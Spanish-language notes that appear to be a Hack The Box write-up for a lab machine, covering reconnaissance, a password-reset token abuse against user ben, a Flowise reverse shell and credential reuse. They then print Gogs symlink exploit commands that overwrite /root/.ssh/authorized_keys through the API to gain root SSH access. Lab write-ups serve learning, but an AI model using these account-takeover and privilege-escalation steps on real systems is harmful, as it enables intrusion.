empece haciendo un reconocimiento con nmap para escanear los puertos

![[Pasted image 20260917233403.png]]

luego analice los puertos un poco mas a fondo para ver que versiones de servicios  estan corriendo

![[Pasted image 20260917233443.png]]

me puse a indagar la version de ssh para ver si era vuln

![[Pasted image 20260917233840.png]]
![[Pasted image 20260917233933.png]]

luego indagare un poco mas, me voy a ver la web que tiene montada

![[Pasted image 20260917234032.png]]

intento acceder con la ip, me redirige a la pagina, voy a poner la web en el /etc/hosts, para que me lo reconozca

![[Pasted image 20260917234333.png]]

entrando a la pagina, hice un reconocimiento de usuarios, supongo que esos son usuarios que hay por detras
![[Pasted image 20260917234536.png]]

me puse a hacer escaneo de directorios con gobuster pero realmente no encontre nada

![[Pasted image 20260918000343.png]]

voy a indagar un poco mas proundo en la maquina con ctrl+u vere el codigo de atras para ver si encuentro algun js

![[Pasted image 20260918000613.png]]

indagando, me encontre con esto, supongo que  en assets hay mas cosas, entonces voy a analizarlo con gobuster 

viendo el codigo de la pagina, no encontre nada, asi que hable con deep seek para ver que me decia, me recomendo ver por subdominos, entonces usando gobuster encontre algo

![[Pasted image 20260918001536.png]]

ns si esto me ayude, pero lo mandare para el /etc/hosts para que pasa

![[Pasted image 20260918001624.png]]

yo soy el mejor, encontramos un login, vamos a ver que hacemos con esto

indagando la pagina, encontre varios .js, 
![[Pasted image 20260918004348.png]]![[Pasted image 20260918004358.png]]
![[Pasted image 20260918004410.png]]
![[Pasted image 20260918004425.png]]

no se que puede llegar a encontrar aqui

aparte de esto, me di cuenta de que existe el usuario ben
![[Pasted image 20260918004520.png]]

me dio el codigo 401, entonces ben existe, lo que hay que averiguar su contraseña
![[Pasted image 20260918004644.png]]

sabiendo esto, busque como pedirle a la api que me mande el token, teniendo en cuenta el script de forgot password

el codigo es este:

```
import React, { useState, useEffect } from "react";
import { Link } from "react-router-dom";

// Componentes visuales (Material-UI / librería base)
import {
  useTheme,
  Stack,
  Typography,
  Button,
  Box,
  Card as MainCard,
} from "@mui/material";

// Componentes e iconos del proyecto
import { Input } from "./Input-CyGdJmMA.js";
import { BackdropLoader } from "./BackdropLoader-BoiYf2ra.js";
import {
  Alert,
  IconExclamationCircle,
} from "./IconExclamationCircle-CpN1RXoF.js";
import { IconCircleCheck } from "./IconCircleCheck-BQawbm75.js";

// Hooks y capa de API
import { useLicense } from "./hooks/useLicense";
import { useApi } from "./hooks/useApi";
import { authApi } from "./api";

const inputConfig = {
  label: "Username",
  name: "username",
  type: "email",
  placeholder: "user@company.com",
};

const ForgotPassword = () => {
  const theme = useTheme();
  const { isEnterpriseLicensed } = useLicense();

  // Estados del formulario y feedback
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [alert, setAlert] = useState(null); // { type: "error" | "success", msg: string }

  // Hook de llamada a la API
  const forgotPasswordApi = useApi(authApi.forgotPassword);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    await forgotPasswordApi.request({ user: { email } });
  };

  // Manejo de errores
  useEffect(() => {
    if (forgotPasswordApi.error) {
      const errorPayload = forgotPasswordApi.error.response?.data;
      const message =
        typeof errorPayload === "object"
          ? errorPayload.message
          : errorPayload;

      setAlert({
        type: "error",
        msg: message ?? "Failed to send instructions, please contact your administrator.",
      });
      setLoading(false);
    }
  }, [forgotPasswordApi.error]);

  // Manejo de éxito
  useEffect(() => {
    if (forgotPasswordApi.data) {
      setAlert({
        type: "success",
        msg: "Password reset instructions sent to the email.",
      });
      setLoading(false);
    }
  }, [forgotPasswordApi.data]);

  return (
    <MainCard>
      <Stack flexDirection="column" sx={{ width: "480px", gap: 3 }}>
        {/* Notificación de Error */}
        {alert?.type === "error" && (
          <Alert
            icon={<IconExclamationCircle />}
            variant="filled"
            severity="error"
          >
            {alert.msg}
          </Alert>
        )}

        {/* Notificación de Éxito */}
        {alert?.type === "success" && (
          <Alert
            icon={<IconCircleCheck />}
            variant="filled"
            severity="success"
          >
            {alert.msg}
          </Alert>
        )}

        {/* Título y enlace de navegación */}
        <Stack sx={{ gap: 1 }}>
          <Typography variant="h1">Forgot Password?</Typography>
          <Typography variant="body2" sx={{ color: theme.palette.grey[600] }}>
            Have a reset password code?{" "}
            <Link
              to="/reset-password"
              style={{ color: theme.palette.primary.main }}
            >
              Change your password here
            </Link>
            .
          </Typography>
        </Stack>

        {/* Formulario */}
        <form onSubmit={handleSubmit}>
          <Stack sx={{ width: "100%", gap: 2 }}>
            <Box>
              <div style={{ display: "flex", flexDirection: "row" }}>
                <Typography>
                  Email<span style={{ color: "red" }}> *</span>
                </Typography>
                <div style={{ flexGrow: 1 }} />
              </div>

              <Input
                inputParam={inputConfig}
                value={email}
                onChange={(val) => setEmail(val)}
                showDialog={false}
              />

              {isEnterpriseLicensed && (
                <Typography variant="caption">
                  <i>
                    If you forgot the email you used for signing up, please
                    contact your administrator.
                  </i>
                </Typography>
              )}
            </Box>

            <Button
              type="submit"
              variant="contained"
              disabled={!email}
              style={{ borderRadius: 12, height: 40, marginRight: 5 }}
            >
              Send Reset Password Instructions
            </Button>
          </Stack>
        </form>

        <BackdropLoader open={loading} />
      </Stack>
    </MainCard>
  );
};

export default ForgotPassword;
```

realmente no se casi nada de js, entonces le pregunte a gemini que hacia el codigo y me dijo esto: 
**¿Qué hace exactamente este código?**

- **Flujo de recuperación de contraseña:** Renderiza una tarjeta con un campo para ingresar un correo electrónico y solicitar el restablecimiento de credenciales.
    
- **Consumo de endpoint (`b.forgotPassword` / `authApi.forgotPassword`):** Al enviar el formulario (`handleSubmit`), empaqueta el input en el payload `{ user: { email: i } }` y dispara una petición HTTP POST vía un hook (`useApi`).
    
- **Bloqueo y carga:** Activa un overlay de carga (`BackdropLoader`) mientras la petición está en vuelo.
    
- **Control de respuestas asíncronas:** Mediante dos `useEffect`, escucha si la API resolvió con éxito (`r.data`) para mostrar un banner verde, o si falló (`r.error`) para extraer el mensaje de error del backend y mostrar un banner rojo.
    
- **Navegación secundaria:** Incluye un enlace hacia `/reset-password` para usuarios que ya poseen un código o token recibido previamente.

le pregunte como tendria que hacer para que me mande un jwt a mi terminal, me dijo esto

```
curl -X POST http://localhost:3000/api/v1/forgot-password \ -H "Content-Type: application/json" \ -d '{"user": {"email": "usuario@ejemplo.com"}}'

```

ya sabemos que ben es un usuario, entonces lo cambiariamos a esto:

```
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

![[Pasted image 20260918010317.png]]

una vez con el token conseguido, cambiamos la contraseña del mail, y nos logeamos

![[Pasted image 20260918010300.png]]

una vez aqui, me fui a la parte de api keys y encontre esto: 
![[Pasted image 20260918012202.png]]

no se para que pueda usarlo, entonces le pregunte a deep seek que podria hacer, me dijo lo siguiente:

![[Pasted image 20260918012229.png]]

la unica que me dio resultados interesantes fue la bearer token, no sabia lo que era entonces lo indage:
**bearer token** (o token de portador) es una ==cadena de caracteres cifrada o aleatoria que otorga acceso a recursos protegidos en una API o servidor==, funcionando bajo la premisa de que **quien porta o tiene el token recibe la autorización**. 

![[Pasted image 20260918012404.png]]

indangando en la pagina, me doy cuenta de que flowise esta en la version 3.0.5, y hay varios cves, entonces voy a probar a ver que tal, busque en github y vi este: https://github.com/advisories/GHSA-3gcm-f6qx-ff7p, vamos a pobrar a ver que tal

use este payload para conseguir una reverse shell y entrar a la maquina
![[Pasted image 20260918230346.png]]

adentro de la maquina me doy cuenta de que estoy en un contenedor de docker, entonces voy a averiguar como salir, despues de un largo rato de busqueda, me di cuenta que le pase literalmente por encima hace 1 hora a la respuesta, ya habia visto la forma de irme a la cuenta del usuario ben, pero en el momento creo que se me olvido y lo pase de largo

![[Pasted image 20260918235720.png]]

pude hace rato haber pasado al proximo usuario, pero bueno, son cosas que uno tiene q pasar cuando uno e medio etupido

![[Pasted image 20260918235825.png]]

aqui podemos darnos cuenta que encontramos credenciales de smtp, entonces vamos a probar 

![[Pasted image 20260919000031.png]]

aqui ya estoy andetro del usuario ben
![[Pasted image 20260919012205.png]]

-----

me quede trabado un buen rato en vd, asi que vi la guia de htb, entonces descubri que habia otro dominio, realmente queria buscar una forma de elevar privilegios, pero nada de nada, aunque no voy a mentir, no lo intente literalmente todo, pero poco a poco se aprende, aqui me falto indagar mas en la maquina

![[Pasted image 20260919002145.png]]

encontramos esta pagina

![[Pasted image 20260919002444.png]]

no tenia ni la mas minima idea de lo que era gogs ni como funcionaba, pero ni idea

encontre la version del mismo, realmente tuve que necesitar ayuda de un writeup
![[Pasted image 20260919011200.png]]
ya se que debo de indagar un poco mas al momento de analizar webs asi, busque por alguna vulnerabilidad de esta version de gogs, y encontre el  CVE-2025-8110, eso si QUE LARGO ES EL PROCESO DE EXPLOTAR ESTO, dios mio, que aburrido, realmente me guie del write up oficial de htb

primero creamos un nuevo repo
![[Pasted image 20260919011819.png]]
luego lo traemos a nuestra pc
git clone http://staging-v2-code.dev.silentium.htb/martin1/test.git
cd test
# Creamos el symlink apuntando al authorized_keys de root
ln -s /root/.ssh/authorized_keys overwrite_me
# Configuración y commit
git config user.email "martin@martinn.com"
git config user.name "martin1"
![[Pasted image 20260919011923.png]]
git add overwrite_me
git commit -m "symlink abuse"
# Push (con force por el README del remoto)
git push -f origin master
# Obtenemos el SHA del blob
git ls-tree HEAD overwrite_me
# 120000 blob 9c87fc525b63ebd989fa409533d3be1b295d6ec3    overwrite_me

### Generación de token de API y clave SSH

1. **Token de API** en Gogs: `Settings → Applications → Generate New Token`.
    
2. **Clave SSH**:
    
 
    ssh-keygen -t ed25519 -f ~/.ssh/id_gogs -N ""
    echo -n "$(cat ~/.ssh/id_gogs.pub)" | base64 -w0
    

### Escritura en `/root/.ssh/authorized_keys`

Aprovechamos la API de Gogs que sigue el symlink:

bash
```

curl -X PUT \
  -H "Authorization: token <TU_TOKEN>" \
  -H "Content-Type: application/json" \
  "http://staging-v2-code.dev.silentium.htb/api/v1/repos/martin1/test/contents/overwrite_me?ref=master" \
  -d '{
    "message": "overwrite via symlink",
    "content": "<BASE64_DE_TU_CLAVE_PUBLICA>",
    "sha": "9c87fc525b63ebd989fa409533d3be1b295d6ec3"
  }'
```


luego, accedi por ssh
![[Pasted image 20260919012057.png]]
![[Pasted image 20260919012135.png]]